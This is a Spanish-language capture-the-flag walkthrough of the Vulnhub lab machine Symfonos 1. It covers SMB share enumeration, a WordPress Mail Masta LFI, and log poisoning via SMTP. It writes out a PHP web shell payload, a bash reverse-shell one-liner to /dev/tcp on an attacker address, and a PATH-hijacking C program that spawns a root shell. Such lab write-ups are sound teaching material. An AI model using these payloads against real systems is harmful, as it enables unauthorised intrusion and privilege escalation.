---
layout: single
title: Symfonos 1 - Vulnhub
excerpt: "Para vulnerar esta máquina nos aprovechamos de qué en el recurso SMB podemos leer un .txt con posibles credenciales para usuarios del sistema, vemos un usuario del sistema en un comentario de un directorio en el SMB, logrando entrando a éste usuario, dandonos una nueva ruta para el servicio http del :80, corriendo allí un CMS WordPress con una versión de Mail Masta vulnerable a LFI, posteriormente nos aprovechamos del recurso SMTP para enviar un correo con código malicioso PHP y convertir el LFI a RCE mediante un Log Poisoning."
date: 10/11/2023
classes: wide
header:
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp

tags:
  - SMB enumeration
  - Information Leakage
  - WordPress enumeration
  - Abusing WordPress plugin - Mail Masta 1.0
  - LFI
  - Log Poisoning to log's SMTP > RCE
  - Abusing SUID privilege
  - PATH Hijacking
---


Para vulnerar esta máquina nos aprovechamos de qué en el recurso SMB podemos leer un .txt con posibles credenciales para usuarios del sistema, vemos un usuario del sistema en un comentario de un directorio en el SMB, logrando entrando a éste usuario, dandonos una nueva ruta para el servicio http del :80, corriendo allí un CMS WordPress con una versión de Mail Masta vulnerable a LFI, posteriormente nos aprovechamos del recurso SMTP para enviar un correo con código malicioso PHP y convertir el LFI a RCE mediante un Log Poisoning.

# PortScan
___

```
 # Nmap 7.93 scan initiated Fri Nov 10 10:20:18 2023 as: nmap -sCV -p22,25,80,139,445 -oN targeted 192.168.204.157
 Nmap scan report for 192.168.204.157
 Host is up (0.00070s latency).
 
 PORT    STATE SERVICE     VERSION
 22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
 | ssh-hostkey: 
 |   2048 ab5b45a70547a50445ca6f18bd1803c2 (RSA)
 |   256 a05f400a0a1f68353ef45407619fc64a (ECDSA)
 |_  256 bc31f540bc08584bfb6617ff8412ac1d (ED25519)
 25/tcp  open  smtp        Postfix smtpd
 | ssl-cert: Subject: commonName=symfonos
 | Subject Alternative Name: DNS:symfonos
 | Not valid before: 2019-06-29T00:29:42
 |_Not valid after:  2029-06-26T00:29:42
 |_ssl-date: TLS randomness does not represent time
 |_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
 80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
 |_http-server-header: Apache/2.4.25 (Debian)
 |_http-title: Site doesn't have a title (text/html).
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
 MAC Address: 00:0C:29:94:A5:C3 (VMware)
 Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
 | smb-os-discovery: 
 |   OS: Windows 6.1 (Samba 4.5.16-Debian)
 |   Computer name: symfonos
 |   NetBIOS computer name: SYMFONOS\x00
 |   Domain name: \x00
 |   FQDN: symfonos
 |_  System time: 2023-11-10T08:20:16-06:00
 |_clock-skew: mean: 1h59m44s, deviation: 3h27m51s, median: -15s
 |_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
 | smb2-security-mode: 
 |   311: 
 |_    Message signing enabled but not required
 | smb2-time: 
 |   date: 2023-11-10T14:20:16
 |_  start_date: N/A
 | smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 10 10:20:32 2023 -- 1 IP address (1 host up) scanned in 14.27 seconds
```

# Web Site
___
![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110114002.png)


# Enumeración SMB
____

Cuando escaneamos los puertos vimos que en el **:445** está corriendo un **SMB**, cuyo puerto suele usarse para tener recursos compartidos, procedemos a enumerar éste puerto con la herramienta "**smbmap**".

```bash
smbmap -H 192.168.x.x
```

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110114741.png)

Tendríamos permisos para leer el directorio de "**anonymous**" así que entramos para ver qué hay.

```bash
smbmap -H 192.168.x.x -r anonymous
```

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110114922.png)

Tenemos un **.txt** dentro del directorio "**anonymous**" que podemos leer, procedemos a descargárnoslo en local para ver qué contiene.
```bash
smbmap -H 192.168.204.158 -r anonymous --download anonymous/attention.txt
```

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110115529.png)

Aparentemente es una pista de posibles claves para usuarios válidos del sistema, pero aún no conocemos ninguno, sin embargo, a la hora de la enumeración de los recursos **SMB**, vimos que un directorio como comentario tiene "**Helios Personal Share**", por lo qué probablemente exista un usuario llamado "**Helios/helios**", así que procedemos a intentar conectarnos como el usuario helios con las contraseñas típicas qué pudimos obtener del directorio "anonymous".


![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110120017.png)

Logramos entrar a **SMB** como el usuario **Helios**, y ahora podemos leer su directorio personal, por lo qué entramos a ver qué hay.

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110120125.png)

Tenemos 2 .**txt's** así qué procedemos a descargarnoslos para ver qué hay.


![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110120259.png)

Un **txt** aparentemente nos chiva lo que podría ser un directorio, probamos este directorio en el servicio web del **:80**, a ver sí existe.


# Enumeración WordPress
______


![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110120550.png)

El directorio existe, y está con un CMS **WordPress**, sí vemos el código fuente tendríamos a la vista varios **plugins** del CMS, encontrándonos así con que existe el plugin Mail-Masta.

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110121140.png)

Sí buscamos en **exploit-db** vulnerabilidades existentes para **Mail-Masta**, encontraríamos este [PoC](https://www.exploit-db.com/exploits/40290) qué nos da una ruta donde podemos llevar a cabo un **LFI**.

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110121517.png)

Se me ocurrió tratar de ver claves privadas de **SSH**, ver log's de SSH & Apache, pero no logré ver nada, lo qué sí podíamos ver eran los log's del servicio **SMTP**.

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110121818.png)

Estamos logrando ver los log's del **SMTP** para el usuario **helios**, y como vemos en la **URL** se está interpretando por **PHP**, por lo qué se me ocurre llevar a cabo un **Log Poisoning** enviando un correo con código PHP malicioso a helios.

DATA para el correo enviado:
```bash
<?php system($_GET['cmd']); ?>  
```

De forma qué podremos controlar el comando qué queramos ejecutar desde la URL.

A continuación se muestra una imagen de como se envió el correo con código malicioso PHP.

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110122836.png)

Sí todo ha ido bien, deberíamos ejecutar comando en la URL.


![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110123058.png)

Hemos convertido el **Log Poisoning** en un **RCE**, así que ya podríamos entablarnos una Reverse Shell.

1. Nos ponemos en escucha por el **443**.
2. Ponemos el típico **One Liner** en la URL urlencodeado.
```bash
bash -c "bash -i >%26 /dev/tcp/192.168.x.x/port 0>%261"
```

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110123554.png)

Y ya estaríamos dentro de la máquina, faltaría darle **Tratamiento a la TTY**, qué si no sabes cómo, te recomiendo [((IR AQUÍ))](https://4uli.github.io/tratamiento-tty/)


# Escalada de Privilegio
____

Estando como el usuario Helios nos interesaría convertirnos en ROOT, empecemos...

Empecé buscando archivos con permisos SUID.

```bash
find / -perm -4000 2>/dev/null
```

Encontrando así un binario con nombre "**statuscheck** y SUID de ROOT".
![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110124116.png)

Investigando este binario, al hacerle un string, descubrí qué está haciendo una petición con "curl" pero sólo está llamando la ruta relativa, por lo qué podríamos llevar a cabo un **Path Hijacking.**

```bash
strings /opt/statuscheck 
```
![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110124319.png)


Para llevar a cabo nuestro **Path Hijacking**, vamos a donde podamos escribir, en este caso "**/tmp/**" para crear allí un archivo script malicioso en **C** con el mismo nombre de "**curl**" y modificar la variable de entorno del OS.

Cremoas el .C
```bash
nano curl.c
```

Código del script malicioso.
```python
#include <unistd.h>

int main(void) {
    setuid(0);
    setgid(0);
    char *binaryPath = "/bin/bash";
    char *args[] = {binaryPath, "-p", NULL};
    
    execv(binaryPath, args);
    return 0;
}

```

Compilamos el curl.c.
```bash
gcc curl.c -o curl
```

Ahora modificamos la variable de entorno del **OS** poniendo la ruta **"/tmp/"** antes qué llegue a la ruta real del binario **curl** de forma qué lea nuestro **curl** malicioso.

```bash
export PATH=/tmp/:$PATH
```

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110125050.png)

Ahora al ejecutar el "**statuscheck**" obtendríamos una bash como **ROOT**.

![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231110125217.png)
